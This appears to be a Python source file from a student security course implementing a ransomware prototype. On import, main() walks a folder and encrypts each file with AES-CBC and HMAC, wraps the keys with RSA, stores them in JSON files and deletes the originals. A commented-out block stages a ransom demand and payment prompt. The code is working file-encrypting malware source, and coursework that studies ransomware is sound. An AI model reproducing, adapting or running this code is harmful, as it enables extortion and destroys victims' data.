import os
import os.path
import json
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
from cryptography.hazmat.primitives import padding, hashes, hmac, asymmetric, serialization
from cryptography.hazmat.primitives.asymmetric import rsa
from cryptography.hazmat.backends import default_backend
from PIL import Image
import io
import base64

def genRSA(size):

    try:
        if os.path.exists('pk.pem') or os.path.exists('prk.pem'):
            print('Already a key pair')
            with open("pk.pem") as file:
                pk = file.read()

            with open("prk.pem") as file:
                private = file.read()
        else:
            raise Exception()

    except:
        print("No key pair, generating")
        prk = rsa.generate_private_key(
            public_exponent = 65537,
            key_size = size,
            backend = default_backend()
            )
        
        private = prk.private_bytes(
            encoding = serialization.Encoding.PEM,
            format=serialization.PrivateFormat.PKCS8,
            encryption_algorithm=serialization.NoEncryption() #BestAvailableEncryption(b'go')
            )
        with open("prk.pem", 'wb') as file:
            file.write(private)
            
        public = prk.public_key()
        pk = public.public_bytes(
            encoding = serialization.Encoding.PEM,
            format=serialization.PublicFormat.SubjectPublicKeyInfo
            )
        with open("pk.pem", 'wb') as file:
            file.write(pk)

        print("Keys Made")

def walkRSA(size):
    
    prk = rsa.generate_private_key(
            public_exponent = 65537,
            key_size = size,
            backend = default_backend()
            )
        
    private = prk.private_bytes(
        encoding = serialization.Encoding.PEM,
        format=serialization.PrivateFormat.PKCS8,
        encryption_algorithm=serialization.NoEncryption() #BestAvailableEncryption(b'go')
        )
        
    public = prk.public_key()
    pk = public.public_bytes(
        encoding = serialization.Encoding.PEM,
        format=serialization.PublicFormat.SubjectPublicKeyInfo
        )

    return pk, private
    


def myEncrypt(m, k):

    if(len(k) < 32):
        print('Error, key must be 32 bytes')
    else:
        IV = os.urandom(16)
        backend = default_backend()

        pad = padding.PKCS7(256).padder()
        p_data = pad.update(m)
        p_data += pad.finalize()

        cipher = Cipher(algorithms.AES(k), modes.CBC(IV), backend=backend)
        encryptor = cipher.encryptor()
        ct = encryptor.update(p_data)+encryptor.finalize()
  
        return ct, IV

def myEncryptHMAC(m, k, hKey):

    if(len(k) < 32):
        print('Error, key must be 32 bytes')
    else:
        IV = os.urandom(16)
        backend = default_backend()

        pad = padding.PKCS7(256).padder()
        p_data = pad.update(m)
        p_data += pad.finalize()

        cipher = Cipher(algorithms.AES(k), modes.CBC(IV), backend=backend)
        encryptor = cipher.encryptor()
        ct = encryptor.update(p_data)+encryptor.finalize()

        h = hmac.HMAC(hKey, hashes.SHA3_512(), backend=default_backend())
        h.update(ct)
        t = h.finalize()
        
        return ct, IV, t

def myfileEncrypt(path):

    key = os.urandom(32)
    img = open(path, "rb")
    m = img.read()
    img.close()

    fExt = os.path.splitext(path)[1]

    (ct, IV) = myEncrypt(m, key)

    img = open(path, "wb")
    img.write(ct)
    img.close()

    return (ct, IV, key, fExt)


def myfileEncryptHMAC(path):

    key = os.urandom(32)
    hKey = os.urandom(32)
    img = open(path, "rb")
    m = img.read()
    img.close()

    fExt = os.path.splitext(path)[1]

    (ct, IV, t) = myEncryptHMAC(m, key, hKey)

    img = open(path, "wb")
    img.write(ct)
    img.close()

    return (ct, IV, t, key, hKey, fExt)

def myRSAEncrypt(path, pTK, pTK2):
    from cryptography.hazmat.primitives.asymmetric import padding
    
    C, IV, t, key, hKey, fExt = myfileEncryptHMAC(path)

    newK = key+hKey
    
    with open(pTK, "rb") as key_file:
        pk = serialization.load_pem_public_key(
            key_file.read(),
            backend=default_backend()
            )

    with open(pTK2, "rb") as key_file:
        prk = serialization.load_pem_private_key(
            key_file.read(),
            password=None,
            backend=default_backend()
            )    
    
    RSACipher = pk.encrypt(
        newK,
        padding.OAEP(
            mgf = padding.MGF1(algorithm=hashes.SHA256()),
            algorithm=hashes.SHA256(),
            label=None
            )
        )
    
    sig = prk.sign(
        RSACipher,
        padding.PSS(
            mgf = padding.MGF1(hashes.SHA256()),
            salt_length = padding.PSS.MAX_LENGTH
        ),
    hashes.SHA256()
    )
        

    return RSACipher, C, IV, t, fExt, sig

def myRSADecrypt(RSACipher, C, IV, t, path, pTK, sig):
    from cryptography.hazmat.primitives.asymmetric import padding

    with open(pTK, "rb") as key_file:
        prk = serialization.load_pem_private_key(
            key_file.read(),
            password=None,
            backend=default_backend()
            )

        pub = prk.public_key()

        pub.verify(
            sig,
            RSACipher,
            padding.PSS(
                mgf = padding.MGF1(hashes.SHA256()),
                salt_length = padding.PSS.MAX_LENGTH
        ),
    hashes.SHA256()
    )
            

    newK = prk.decrypt(
        RSACipher,
        padding.OAEP(
            mgf = padding.MGF1(algorithm=hashes.SHA256()),
            algorithm=hashes.SHA256(),
            label=None
            )
        )

    key = newK[0:32]
    hKey = newK[32:]
    
    pt = myfileDecryptHMAC(C, IV, t, key, hKey, path)

    
    return pt

def myDecrypt(k, IV, ct):

    backend = default_backend()
    
    c = Cipher(algorithms.AES(k), modes.CBC(IV), backend=backend)
    decrypt = c.decryptor()
    pt = decrypt.update(ct)+decrypt.finalize()

    unPad = padding.PKCS7(256).unpadder()
    m = unPad.update(pt)
    m += unPad.finalize()

    return m

def myDecryptHMAC(k, hKey, IV, ct, t):

    backend = default_backend()

    g = hmac.HMAC(hKey, hashes.SHA3_512(), backend = backend);
    g.update(ct)
    g.verify(t)
    
    c = Cipher(algorithms.AES(k), modes.CBC(IV), backend=backend)
    decrypt = c.decryptor()
    pt = decrypt.update(ct)+decrypt.finalize()

    unPad = padding.PKCS7(256).unpadder()
    m = unPad.update(pt)
    m += unPad.finalize()

    return m

def myfileDecrypt(ct, IV, k, path):
    pt = myDecrypt(k, IV, ct)

    img = open(path, "wb")
    img.write(pt)
    img.close()

    return pt


def myfileDecryptHMAC(ct, IV, t, k, hKey, path):
    pt = myDecryptHMAC(k, hKey, IV, ct, t)

    img = open(path, "wb")
    img.write(pt)
    img.close()

    return pt

def walkDir(wPath):
    i = 0
    filePaths = []
    pTpub = 'C:\\Users\\tacos\\Desktop\\CECS 378\\pk.pem'
    pTpri = 'C:\\Users\\tacos\\Desktop\\CECS 378\\prk.pem'
    for dirName, subdirList, fileList in os.walk(wPath):
        ptF = dirName
        for fName in fileList:
            ptF = ptF+"\\"+fName

            if(not fName.endswith('.json') and not fName.endswith('.pem') and not fName.endswith('.py')):
                RSACipher, C, IV, t, fExt, sig = myRSAEncrypt(ptF, pTpub, pTpri)
                print(fName)
            else:
                ptF = dirName
                continue
            #myRSADecrypt(RSACipher, C, IV, t, ptF, pTpri, sig) 
            RSACipher = base64.b64encode(RSACipher).decode('utf-8')
            C = base64.b64encode(C).decode('utf-8')
            IV = base64.b64encode(IV).decode('utf-8')
            t = base64.b64encode(t).decode('utf-8')
            sig = base64.b64encode(sig).decode('utf-8')
            fCreds = [
                {"RSA":RSACipher},
                {"C":C},
                {"IV":IV},
                {"tag":t},
                {"ext":fExt},
                {"sig":sig}
                ]
            with open('C:\\Users\\tacos\\Desktop\\CECS 378\\json\\file'+str(i)+'.json', 'w') as f:
                json.dump(fCreds, f)
            print(ptF)
            filePaths.append(ptF)
            os.remove(ptF)
            ptF = dirName
            fCreds = []
            i+=1
            
    with open('C:\\Users\\tacos\\Desktop\\CECS 378\\paths\\pathFile.json', 'w') as pb:
        json.dump(filePaths, pb)

def walkBack(wPath, filePaths):
    i = 0

    pTpub = 'C:\\Users\\tacos\\Desktop\\CECS 378\\pk.pem'
    pTpri = 'C:\\Users\\tacos\\Desktop\\CECS 378\\prk.pem'
    
    for ptF in filePaths:
##        pTpub = 'C:\\Users\\tacos\\Desktop\\keys\\pubKey'+str(i)+".pem"
##        pTpri = 'C:\\Users\\tacos\\Desktop\\keys\\priKey'+str(i)+".pem"

        with open('C:\\Users\\tacos\\Desktop\\CECS 378\\json\\file'+str(i)+'.json', 'r') as f:
            creds = json.load(f)

        RSA = base64.b64decode(creds[0].get('RSA'))
        cipher = base64.b64decode(creds[1].get('C'))
        IV = base64.b64decode(creds[2].get('IV'))
        tag = base64.b64decode(creds[3].get('tag'))
        ext = creds[4].get('ext')
        s = base64.b64decode(creds[5].get('sig'))
        myRSADecrypt(RSA, cipher, IV, tag, ptF, pTpri, s)
        creds = []
        i+=1

    
def main():

    genRSA(2048)
    #path = "C:\\Users\\tacos\\Desktop\\CECS 378\\gir.jpg"
    #pTpub = "C:\\Users\\tacos\\Desktop\\CECS 378\\pk.pem"
    #pTpri = "C:\\Users\\tacos\\Desktop\\CECS 378\\prk.pem"
    #ptF = 'C:\\Users\\tacos\\Desktop\\378Dump\\city.jpg'
    wPath = 'C:\\Users\\tacos\\Desktop\\378Dump'
    
    #Encrypt Directory
    walkDir(wPath)

    #Decrypt Directory
    #with open('C:\\Users\\tacos\\Desktop\\CECS 378\\paths\\pathFile.json', 'r') as f:
    #        creds = json.load(f)
    #walkBack(wPath, creds)

    #RSACipher, C, IV, t, fExt, sig = myRSAEncrypt(wPath, pTpub, pTpri)
    
    #$PATH: C:\Users\tacos\Desktop\CECS 378
    
    #(C, IV, k, fExt) = myfileEncrypt(path)
    #(C, IV, t, k, hKey, fExt) = myfileEncryptHMAC(path)
   
##    x = input('Pay ransom to decrypt data with a given valid input. (Y/N)')
##
##    if(x.upper() == "Y"):
##        print('You have paid, the code to recover data is: entropy')
##        y = input('Enter passcode here: ')
##        if(y == 'entropy'):
##            #myfileDecryptHMAC(C, IV, t, k, hKey, path)
##            #myfileDecrypt(C, IV, k, path)
##            myRSADecrypt(RSACipher, C, IV, t, path, pTpri, sig)
##            f = Image.open('gir.jpg')
##            f.show()
##            f.close()
##            print('You successfully saved your assets and I\'m rich, Hurray!')
##            
##        else:
##            #myfileDecryptHMAC(C, IV, t, k, hKey, path)
##            #myfileDecrypt(C, IV, k, path)
##            myRSADecrypt(RSACipher, C, IV, t, path, pTpri, sig)
##            print('Failure...............')
##            f = open(path, "rb")
##            m = f.read()
##            print(m)
##            f.close()
##    else:
##        #myfileDecryptHMAC(C, IV, t, k, hKey, path)
##        #myfileDecrypt(C, IV, k, path)
##        myRSADecrypt(RSACipher, C, IV, t, path, pTpri, sig)
##        print("You failed to pay, enjoy decrypting manually")
##        f = open(path, "rb")
##        m = f.read()
##        print(m)
##        f.close()
 
main()



